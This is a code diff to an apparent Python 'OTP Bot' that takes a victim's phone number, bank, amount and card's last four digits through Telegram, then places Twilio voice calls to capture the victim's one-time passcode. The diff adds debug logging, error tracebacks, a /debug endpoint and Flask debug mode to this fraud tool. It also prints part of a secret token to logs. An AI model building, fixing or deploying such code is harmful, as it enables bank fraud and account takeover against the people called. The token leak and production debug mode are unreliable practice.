@@ -1,7 +1,9 @@
 import os
+import sys
+import traceback
 import requests
 import asyncio
-from flask import Flask, request
+from flask import Flask, request, jsonify
 from twilio.twiml.voice_response import VoiceResponse, Gather
 from twilio.rest import Client
 from telegram import Update
@@ -11,12 +13,16 @@ from telegram.ext import Application, CommandHandler, ConversationHandler, Conte
 TELEGRAM_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN')
 if not TELEGRAM_TOKEN:
     print("ERROR: TELEGRAM_BOT_TOKEN environment variable not set")
-    exit(1)
+    sys.exit(1)
 
 TWILIO_SID = os.environ.get('TWILIO_ACCOUNT_SID')
 TWILIO_AUTH = os.environ.get('TWILIO_AUTH_TOKEN')
 TWILIO_FROM = os.environ.get('TWILIO_FROM_NUMBER')
 BASE_URL = os.environ.get('RENDER_URL', 'https://otp-getter.onrender.com')
+
+print(f"DEBUG: BASE_URL = {BASE_URL}")
+print(f"DEBUG: TWILIO_FROM = {TWILIO_FROM}")
+print(f"DEBUG: TELEGRAM_TOKEN starts with {TELEGRAM_TOKEN[:10]}...")
 
 # Conversation states
 PHONE, BANK, AMOUNT, CARD_LAST4 = range(4)
@@ -78,6 +84,7 @@ async def get_card_last4(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text(f"✅ Call initiated! Call SID: {call.sid}\n\nWaiting for OTP entry...")
     except Exception as e:
         await update.message.reply_text(f"❌ Call failed: {str(e)}")
+        print(f"Twilio error: {e}")
     
     del user_data[user_id]
     return ConversationHandler.END
@@ -89,10 +96,17 @@ async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
 # ==================== FLASK ENDPOINTS ====================
 @app.route("/webhook", methods=['POST'])
 def telegram_webhook():
-    """Handle incoming Telegram updates"""
+    """Handle incoming Telegram updates with full error logging"""
     try:
+        print("DEBUG: Webhook received a POST request")
+        
+        # Get the JSON data
+        json_data = request.get_json(force=True)
+        print(f"DEBUG: JSON data received: {str(json_data)[:200]}...")
+        
         # Create application for this request
         application = Application.builder().token(TELEGRAM_TOKEN).build()
+        print("DEBUG: Application built successfully")
         
         # Add handlers
         application.add_handler(CommandHandler('start', start))
@@ -107,15 +121,21 @@ def telegram_webhook():
             fallbacks=[CommandHandler('cancel', cancel)],
         )
         application.add_handler(conv_handler)
+        print("DEBUG: Handlers added")
         
         # Process update
-        update = Update.de_json(request.get_json(force=True), application.bot)
+        update = Update.de_json(json_data, application.bot)
+        print(f"DEBUG: Update created: {update}")
+        
         asyncio.run(application.process_update(update))
+        print("DEBUG: Update processed successfully")
         
         return "ok", 200
+        
     except Exception as e:
-        print(f"Webhook error: {e}")
-        return "error", 500
+        print(f"ERROR in webhook: {str(e)}")
+        print(f"ERROR traceback: {traceback.format_exc()}")
+        return f"error: {str(e)}", 500
 
 @app.route("/voice", methods=['GET', 'POST'])
 def voice():
@@ -142,18 +162,29 @@ def voice():
     
     return str(response)
 
-@app.route("/")
+@app.route("/", methods=['GET'])
 def index():
     return "OTP Bot is running."
+
+@app.route("/debug", methods=['GET'])
+def debug():
+    """Debug endpoint to check environment variables"""
+    return {
+        "base_url": BASE_URL,
+        "twilio_from": TWILIO_FROM,
+        "telegram_token_set": bool(TELEGRAM_TOKEN),
+        "twilio_creds_set": bool(TWILIO_SID and TWILIO_AUTH)
+    }
 
 def send_telegram_message(chat_id, text):
     url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
     try:
         requests.post(url, json={'chat_id': chat_id, 'text': text})
-    except:
-        pass
+    except Exception as e:
+        print(f"Telegram send error: {e}")
 
 # ==================== RUN ====================
 if __name__ == "__main__":
-    print("Starting OTP Bot on Render...")
-    app.run(host='0.0.0.0', port=5000)
+    print("Starting OTP Bot on Render with DEBUG logging...")
+    print(f"Python version: {sys.version}")
+    app.run(host='0.0.0.0', port=5000, debug=True)
